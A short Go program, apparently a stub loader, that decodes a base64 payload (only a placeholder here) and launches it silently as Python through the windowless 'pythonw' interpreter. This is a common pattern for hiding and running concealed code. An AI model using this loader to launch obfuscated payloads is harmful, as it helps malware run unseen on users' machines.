package main

import (
	"os/exec"
	"encoding/base64"
)

func main() {
	payload := "<BASE64_STUB_CODE>"
	code, _ := base64.StdEncoding.DecodeString(payload)
	cmd := exec.Command("pythonw", "-c", string(code))
	cmd.Start()
}
